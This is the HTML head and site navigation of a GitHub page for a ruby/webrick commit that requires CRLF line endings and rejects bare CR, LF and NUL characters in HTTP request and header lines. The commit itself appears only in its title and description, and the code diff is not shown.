<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-754f5b5e9e7e.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-b5f1d7-fd008e5636c7.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-d41270eb61be.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-c63e9a-b1f4633cac7f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-c65a1055a366.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-8c456ec10f17.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_hydro-analytics-c-2a6094-2f3b5bfd7e3b.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-4e90f1d1076c.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-06c8637a6071.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_morphdom_dist_morphdom-esm_js-node_modules_swc_helpers_esm__define_property_js-5c587dccb470.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-8eb9b2209bcd.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-cd5d89ebdb50.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-590a09-91fdc8802bfa.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_document-metadata_document-metadata_ts-packages_failbot_failbot_ts-b8e9eefcce78.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_updatable-content_updatable-content_ts-a743e72edcf2.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_details-6493f1-b7112815a1fc.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_throttled-input_ts-047775-f7905105dea8.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-6bc7a8849328.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-9082713fc15b.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-ef6d0f-60422ea0562f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-f5c28dea1388.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_virtualized-list_es_inde-8b3def-5e84a4d714f0.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_github_catalyst_lib_index_-280e4f-77dbb2662f19.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_decorators_js-node_modules_delegated-events_di-e161aa-34194327b80d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_scroll-anchoring_dist_scroll-anchoring_esm_js-node_modules_github_hydro--581846-4d52a4aed490.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_ref-selector_ts-98da180bcdc4.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_diffs_blob-lines_ts-app_assets_modules_github_diffs_linkable-line-n-db17fa-ef77e0d5d94c.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/diffs-474bc704e6da.js" defer="defer"></script>
  
  <script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-1f3cc2f0f2da.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/react-core-f6571bc10d64.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-17ccbc80f53b.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-0f0d82031c98.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-1fff13-a67dacb6db80.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_query-core_build_modern_mutation_js-node_modules_tanstack_query-9bf7e4-a1bacdef8ef2.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_query-core_build_modern_queryClient_js-node_modules_tanstack_re-d87a32-ae1d44ebdc99.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_es_mjs-0294cfa498e7.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_query-core_build_modern_queryObserver_js-node_modules_tanstack_-defd52-362960c8d059.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_date-fns_format_mjs-f7e5dd4e3ebd.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_date-fns_addWeeks_mjs-node_modules_date-fns_addYears_mjs-node_modules_da-827f4f-6af178f555c7.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_focus-visible_dist_focus-visible_js-node_modules_lodash-es__isIterateeCa-89abd9-7de41e04a69d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lodash-es__Stack_js-node_modules_lodash-es__Uint8Array_js-node_modules_l-4faaa6-95511fe13c4b.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_hotkey_dist_index_js-node_modules_date-fns_getDaysInMonth_mjs-nod-70c11b-a672e4dfe08c.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_dnd-kit_modifiers_dist_modifiers_esm_js-node_modules_dnd-kit_sortable_di-72228e-99b95b9fca56.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_swc_helpers_esm__define_property_js-node_modules_lodash-es__getAllKeys_j-86c8c2-f6bac8d2298f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_react-virtual_dist_esm_index_js-4f7c027617ef.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_react-relay_index_js-065619a68bd6.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_devlop_lib_default_js-node_modules_mdast-util-from-markdown_lib_index_js-cf17bf-18805d9f38c0.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_mdast-util-gfm_lib_index_js-node_modules_micromark-extension-gfm_index_js-f82ed5454897.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_react-query_build_modern_useQuery_js-node_modules_diff_lib_index_mjs-1bcf85319d2e.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_remark-parse_lib_index_js-node_modules_unified_lib_index_js-4b6c6d51b7cd.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_codemirror_language_dist_index_js-25bc92f8b249.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_react-markdown_lib_index_js-7758bbe44de9.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_codemirror_commands_dist_index_js-fc88b7eb887d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_hastscript_lib_index_js-node_modules_lowlight_lib_all_js-node_modules_re-376063-b532d0267536.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_decorators_js-node_modules_accname_dist_access-a25db5-11cb217a85c0.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_g-emoji-element_dist_index_js-node_modules_github_paste-markdown_-d038b2-4f43f7d0dd65.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_catalyst_lib_index_js-node_modules_primer_styled-react_dist_index-d380a0-163e4c68c274.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_paths_index_ts-8c0a5b7670bb.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_ui-commands_ui-commands_ts-cbee78981c63.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_date-picker_components_DatePicker_tsx-7f759ec8feaf.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_drag-and-drop_drag-and-drop_ts-packages_hydro-analytics_hydro-analytics_ts-0828fc3feb11.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_list-view_src_hooks_use-next-header-tag_ts-packages_list-view_src_ListItem_ListItem_-055669-e6bf905bdc94.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_ref-selector_RefSelector_tsx-bff3ae3032b3.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_copilot-chat_utils_copilot-local-storage_ts-f069d4476bf4.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_copilot-chat_components_tracing_TraceProvider_tsx-fed3f2fdcee6.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_copilot-chat_utils_CopilotChatContext_tsx-packages_safe-html_VerifiedHTML_tsx-41abf46cfa56.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_item-picker_components_RepositoryPicker_tsx-99b664b764bf.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_copilot-markdown_MarkdownRenderer_tsx-081d473bda5f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_history_history_ts-packages_relay-environment_relay-environment_ts-packages_soft-nav-c373e9-03ccda3ea47b.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_use-client-value_use-client-value_ts-packages_issue-create_dialog_CreateIssueDialogE-7c0c7a-e679a255e92d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_commenting_constants_values_ts-packages_document-metadata_document-metadata_ts-packa-c2a275-56582a119a2f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_copilot-chat_components_CopilotIconAnimation_tsx-4f0dd006fa0a.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_app-uuid_app-uuid_ts-packages_signed-commit-badge_index_ts-9d3ba26bd176.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_diff-file-header_diff-file-header_ts-packages_diff-file-tree_diff-file-tree-helpers_-6ec15d-91a03f833b19.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_commit-attribution_index_ts-packages_commit-checks-status_index_ts-packages_current--18e2dc-b3046fcc482e.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_use-hide-footer_use-hide-footer_ts-packages_commits_shared_use-tree-pane_tsx-package-9c5f33-f1ed7d318ac3.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_code-view-shared_utilities_web-worker_ts-packages_code-view-shared_worker-jobs_debou-1b7752-322822facdee.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/commits-2b2f9d26edd1.js" defer="defer"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.140a270411c3d220d298.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/packages_use-client-value_use-client-value_ts-packages_issue-create_dialog_CreateIssueDialogE-7c0c7a.b99d1f27e20530cc0f39.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/commits.8755333b6f68991dc3e6.module.css" />

  <script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_styled-react_dist_index_js-node_modules_swc_helpers_esm__define_p-af893a-aa5fc5be335a.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/packages_notifications-subscriptions-menu_entry_ts-packages_promise-with-resolvers-polyfill_p-df0233-37157a955eee.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/notifications-subscriptions-menu-4fc5098087cd.js" defer="defer"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.140a270411c3d220d298.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/notifications-subscriptions-menu.44a4ce5e60cfd5c27b1a.module.css" />


  <title>Require CRLF line endings in request line and headers · ruby/webrick@ee60354 · GitHub</title>



  <meta name="route-pattern" content="/:user_id/:repository/commit/:name(/*path)" data-turbo-transient>
  <meta name="route-controller" content="commit" data-turbo-transient>
  <meta name="route-action" content="show" data-turbo-transient>
  <meta name="fetch-nonce" content="v2:9f38adf1-c812-b0ac-af8b-09c0614a8f3f">

    
  <meta name="current-catalog-service-hash" content="f3abb0cc802f3d7b95fc8762b94bdcb13bf39634c40c357301c4aa1d67a256fb">


  <meta name="request-id" content="090E:3CC9F:90B13E:B8B10D:68DD7E44" data-pjax-transient="true"/><meta name="html-safe-nonce" content="621076b700a0b48d9c6bdec978a6d0b7aea6408ac2f71a664c2ba672915722b6" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiIwOTBFOjNDQzlGOjkwQjEzRTpCOEIxMEQ6NjhERDdFNDQiLCJ2aXNpdG9yX2lkIjoiMzM3MzcwMjEzNDIzMTgyNTk4OCIsInJlZ2lvbl9lZGdlIjoia29yZWFjZW50cmFsIiwicmVnaW9uX3JlbmRlciI6ImtvcmVhY2VudHJhbCJ9" data-pjax-transient="true"/><meta name="visitor-hmac" content="84a73b7af17c0a014b37858dd5d34b691eba8594d30b2e74664473d0dfe9f988" data-pjax-transient="true"/>


    <meta name="hovercard-subject-tag" content="repository:86644608" data-turbo-transient>


  <meta name="github-keyboard-shortcuts" content="repository,commits,copilot" data-turbo-transient="true" />
  

  <meta name="selected-link" value="repo_commits" data-turbo-transient>
  <link rel="assets" href="https://github.githubassets.com/">

    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/commit/show" data-turbo-transient="true" />

  




    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">

    

      <meta name="description" content="HTTP server toolkit. Contribute to ruby/webrick development by creating an account on GitHub.">

      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">

    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    <meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101" />

      <meta name="twitter:image" content="https://opengraph.githubassets.com/3a452e5e07c2b325e2452d54e34c75fd5a375fe2faf98c459a1a73addfa98364/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Require CRLF line endings in request line and headers · ruby/webrick@ee60354" /><meta name="twitter:description" content="Disallow bare CR, LF, NUL in header and request lines. Tighten
parsing of request lines to only allow single spaces, as specified
in the RFCs.

Forcing this RFC-compliant behavior breaks a lot of t..." />
  <meta property="og:image" content="https://opengraph.githubassets.com/3a452e5e07c2b325e2452d54e34c75fd5a375fe2faf98c459a1a73addfa98364/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101" /><meta property="og:image:alt" content="Disallow bare CR, LF, NUL in header and request lines. Tighten
parsing of request lines to only allow single spaces, as specified
in the RFCs.

Forcing this RFC-compliant behavior breaks a lot of t..." /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="600" /><meta property="og:site_name" content="GitHub" /><meta property="og:type" content="object" /><meta property="og:title" content="Require CRLF line endings in request line and headers · ruby/webrick@ee60354" /><meta property="og:url" content="/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101" /><meta property="og:description" content="Disallow bare CR, LF, NUL in header and request lines. Tighten
parsing of request lines to only allow single spaces, as specified
in the RFCs.

Forcing this RFC-compliant behavior breaks a lot of t..." /><meta property="og:updated_time" content="1719930350" />
  




      <meta name="hostname" content="github.com">



        <meta name="expected-hostname" content="github.com">


  <meta http-equiv="x-pjax-version" content="83c0d5b8b179f3ada98fd9c4468b7cc06e3b500e95179e3662d60df345728101" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="c922ef32c4ab94f8b870c62883f3e41755ec705db76ec4efb0d343458f1e28c7" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="223ebe3875f876a951e700a153901b05e9c166ca6151ca35219c8b544ea30c01" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="adc287f862bbedf5f9b76996c0c6764ede3d396733fbd000e1d9165ce9c9e0b2" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

      <meta name="turbo-cache-control" content="no-cache" data-turbo-transient>

    <meta data-hydrostats="publish">

  <meta name="go-import" content="github.com/ruby/webrick git https://github.com/ruby/webrick.git">

  <meta name="octolytics-dimension-user_id" content="210414" /><meta name="octolytics-dimension-user_login" content="ruby" /><meta name="octolytics-dimension-repository_id" content="86644608" /><meta name="octolytics-dimension-repository_nwo" content="ruby/webrick" /><meta name="octolytics-dimension-repository_public" content="true" /><meta name="octolytics-dimension-repository_is_fork" content="false" /><meta name="octolytics-dimension-repository_network_root_id" content="86644608" /><meta name="octolytics-dimension-repository_network_root_nwo" content="ruby/webrick" />



    

    <meta name="turbo-body-classes" content="logged-out env-production page-responsive">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <meta name="release" content="a1fcd8ecf681ec3435316121533ad0b98c89a51c">
  <meta name="ui-target" content="full">

  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />


  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
    <div data-turbo-body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
      



    <div class="position-relative header-wrapper js-header-wrapper ">
      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>

      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      
      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.140a270411c3d220d298.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/keyboard-shortcuts-dialog.2de9c7d6456a311fce49.module.css" />

<react-partial
  partial-name="keyboard-shortcuts-dialog"
  data-ssr="false"
  data-attempted-ssr="false"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>





      

          

              
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_gsap_index_js-23c9606618ce.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-94fd67-04dd9f3c4754.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/sessions-ac148cb2a2f3.js" defer="defer"></script>

<header class="HeaderMktg header-logged-out js-details-container js-header Details f4 py-3" role="banner" data-is-top="true" data-color-mode=light data-light-theme=light data-dark-theme=dark>
  <h2 class="sr-only">Navigation Menu</h2>

  <button type="button" class="HeaderMktg-backdrop d-lg-none border-0 position-fixed top-0 left-0 width-full height-full js-details-target" aria-label="Toggle navigation">
    <span class="d-none">Toggle navigation</span>
  </button>

  <div class="d-flex flex-column flex-lg-row flex-items-center px-3 px-md-4 px-lg-5 height-full position-relative z-1">
    <div class="d-flex flex-justify-between flex-items-center width-full width-lg-auto">
      <div class="flex-1">
        <button aria-label="Toggle navigation" aria-expanded="false" type="button" data-view-component="true" class="js-details-target js-nav-padding-recalculate js-header-menu-toggle Button--link Button--medium Button d-lg-none color-fg-inherit p-1">  <span class="Button-content">
    <span class="Button-label"><div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div></span>
  </span>
</button>
      </div>

      <a class="mr-lg-3 color-fg-inherit flex-order-2 js-prevent-focus-on-mobile-nav"
        href="/"
        aria-label="Homepage"
        data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to go to homepage&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Logomark;ref_loc:Header&quot;}">
        <svg height="32" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="32" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
</svg>
      </a>

      <div class="d-flex flex-1 flex-order-2 text-right d-lg-none gap-2 flex-justify-end">
          <a
            href="/login?return_to=https%3A%2F%2Fgithub.com%2Fruby%2Fwebrick%2Fcommit%2Fee60354bcb84ec33b9245e1d1aa6e1f7e8132101"
            class="HeaderMenu-link HeaderMenu-button d-inline-flex f5 no-underline border color-border-default rounded-2 px-2 py-1 color-fg-inherit js-prevent-focus-on-mobile-nav"
            data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="95ed5d3b4a693e524438c286dfa027c6d322cfd4e5f6ef3af73d503315830a45"
            data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to Sign in&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Sign in;ref_loc:Header&quot;}"
          >
            Sign in
          </a>
              <div class="AppHeader-appearanceSettings">
    <react-partial-anchor>
      <button data-target="react-partial-anchor.anchor" id="icon-button-323a1ed3-ce91-4065-a821-3108c981025e" aria-labelledby="tooltip-a5fe4b94-026a-4fa3-8820-80d4d19d06db" type="button" disabled="disabled" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium AppHeader-button HeaderMenu-link border cursor-wait">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-sliders Button-visual">
    <path d="M15 2.75a.75.75 0 0 1-.75.75h-4a.75.75 0 0 1 0-1.5h4a.75.75 0 0 1 .75.75Zm-8.5.75v1.25a.75.75 0 0 0 1.5 0v-4a.75.75 0 0 0-1.5 0V2H1.75a.75.75 0 0 0 0 1.5H6.5Zm1.25 5.25a.75.75 0 0 0 0-1.5h-6a.75.75 0 0 0 0 1.5h6ZM15 8a.75.75 0 0 1-.75.75H11.5V10a.75.75 0 1 1-1.5 0V6a.75.75 0 0 1 1.5 0v1.25h2.75A.75.75 0 0 1 15 8Zm-9 5.25v-2a.75.75 0 0 0-1.5 0v1.25H1.75a.75.75 0 0 0 0 1.5H4.5v1.25a.75.75 0 0 0 1.5 0v-2Zm9 0a.75.75 0 0 1-.75.75h-6a.75.75 0 0 1 0-1.5h6a.75.75 0 0 1 .75.75Z"></path>
</svg>
</button><tool-tip id="tooltip-a5fe4b94-026a-4fa3-8820-80d4d19d06db" for="icon-button-323a1ed3-ce91-4065-a821-3108c981025e" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Appearance settings</tool-tip>

      <template data-target="react-partial-anchor.template">
        <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.140a270411c3d220d298.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/appearance-settings.6c63a6de228d6520804d.module.css" />

<react-partial
  partial-name="appearance-settings"
  data-ssr="false"
  data-attempted-ssr="false"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>


      </template>
    </react-partial-anchor>
  </div>

      </div>
    </div>


    <div class="HeaderMenu js-header-menu height-fit position-lg-relative d-lg-flex flex-column flex-auto top-0">
      <div class="HeaderMenu-wrapper d-flex flex-column flex-self-start flex-lg-row flex-auto rounded rounded-lg-0">
          <nav class="HeaderMenu-nav" aria-label="Global">
            <ul class="d-lg-flex list-style-none">
